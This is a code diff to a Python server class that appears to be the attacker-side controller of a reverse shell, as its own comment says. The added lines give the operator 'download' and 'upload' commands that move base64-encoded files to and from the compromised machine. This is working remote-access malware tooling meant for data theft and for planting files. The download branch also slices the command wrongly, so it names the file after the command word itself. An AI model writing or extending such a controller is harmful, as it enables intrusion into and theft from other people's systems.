@@ -1,5 +1,6 @@
 import socket
 import json
+import base64
 
 class Server:
     global s
@@ -30,6 +31,17 @@ class Server:
                 break
             elif command[:2] == "cd" and len(command) > 1:
                 continue
+            elif command[:8] == "download":
+                with open(command[:9], "wb") as file:
+                    result = self.reliable_receive()
+                    file.write(base64.b64decode(result))
+            elif command[:6] == "upload":
+                try:
+                    with open(command[7:],"rb") as fin:
+                        self.reliable_send(base64.b64encode(fin.read()))
+                except:
+                    failed = "Failed to upload"
+                    self.reliable_send(base64.b64encode(failed))
             else:
                 answer = self.reliable_receive()
                 # print the answer from the reverse shell
